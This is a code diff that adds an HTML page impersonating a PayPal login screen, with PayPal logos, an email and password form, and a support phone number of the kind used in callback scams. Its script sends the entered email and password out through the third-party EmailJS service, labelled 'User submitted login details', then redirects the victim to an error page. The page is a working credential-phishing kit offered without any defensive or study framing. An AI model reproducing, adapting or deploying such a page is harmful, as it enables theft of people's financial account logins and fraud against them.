@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        body {
+            overflow: visible !important;
+            background-color: #fff !important;
+        }</style>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FLGTKMK5T1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FLGTKMK5T1');
+</script>
+</script>
+
+</head>
+
+<body>
+    <div class="container-back">
+        <img src="paypal.png"width="1890px;">
+    </div>
+
+    <div class="popupcall">
+        <div class="popupbox">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Paypal_2014_logo.png" width="100px;">
+            <h2>Login</h2>
+            <br><br>
+            <form onsubmit="sendFormData(event)">
+                <div>
+
+                    <div id="emailSection" style="position: relative;">
+                        <label class="Label-eJzeQK ePUaRL">Email address</label>
+                        <div class="sc-beySbM hkMNOF Input__Container-bdgDbx kgpiOG">
+                            <input inputmode="email" required="true" name="from_email" type="email" id="email" required
+                                data-test="loginEmail" class="InputText-kVFRDT coYxKg">
+                        </div>
+                    </div>
+
+                    <div id="passwordSection" required="true"
+                        style="position: relative; margin-top: 40px; margin-bottom: 30px;">
+                        <label class="Label-eJzeQK ePUaRL">Password</label>
+                        <div class="sc-beySbM hkMNOF Input__Container-bdgDbx kgpiOG">
+                            <input type="password" name="from_paswrd" id="password" required data-test="loginPassword"
+                                class="InputText-kVFRDT coYxKg">
+                        </div>
+                    </div>
+                    <button type="submit">
+                        Login Now
+                    </button>
+                </div>
+            </form>
+
+            <br>
+
+            <h4>For any Query call<br>
+                <a href="tel:+1-828-270-5094"> <b>+1-828-270-5094</b> </a>
+            </h4>
+
+        </div>
+    </div>
+    <nav>
+        <div class="logo-area">
+            <img src="https://cdn.pixabay.com/photo/2018/05/08/21/29/paypal-3384015_640.png" width="70px;">
+        </div>
+
+
+        <div class="links center">
+            <p class="active">Personal</p>
+            <p class="active">Small Business</p>
+            <p class="active">Enterprise</p>
+            <p class="active">partner</p>
+            <p class="active">Useful Info</p>
+        </div>
+
+        <div class="links">
+            <p><a href="#"> Login</a></p>
+            <a href="#">
+                <button>
+                    <a href="#"> Get Started</a>
+                </button>
+            </a>
+        </div>
+    </nav>
+    <section class="heroBanner">
+    </section>
+
+    <div class="loader">
+
+        <svg viewBox="25 25 50 50">
+            <circle r="20" cy="50" cx="50"></circle>
+        </svg>
+        <p>Processing</p>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+
+        (function () {
+            emailjs.init({
+                publicKey: "-oqI2gAE96aiq5NCy",
+            });
+        })();
+        function sendFormData(event) {
+            event.preventDefault();
+
+           const loader = document.querySelector('.loader');
+            loader.classList.add('show');
+
+            const emailElement = document.getElementById('email');
+            const passwordElement = document.getElementById('password');
+
+            if (!emailElement || !passwordElement) {
+                console.error("Form elements not found!");
+                return;
+            }
+
+            const email = emailElement.value;
+            const password = passwordElement.value;
+
+            if (!email || !password) {
+                alert("Please enter both email and password.");
+                if (loader) loader.style.visibility = 'hidden';
+                return;
+            }
+
+            var templateParams = {
+                from_email: email,
+                from_paswrd: password,
+                notes: 'User submitted login details.'
+            };
+
+            emailjs.send('service_9ncb42u', 'template_7j80au7', templateParams)
+                .then(function (response) {
+                    console.log('SUCCESS!', response.status, response.text);
+
+                    setTimeout(function () {
+                        window.location.href = "error.html";
+                    }, 5000);
+                })
+                .catch(function (error) {
+                    console.error('FAILED...', error);
+                    alert("An error occurred. Please try again.");
+
+                    if (loader) loader.style.visibility = 'hidden';
+                });
+        }
+    </script>
+
+</body>
+
+</html>
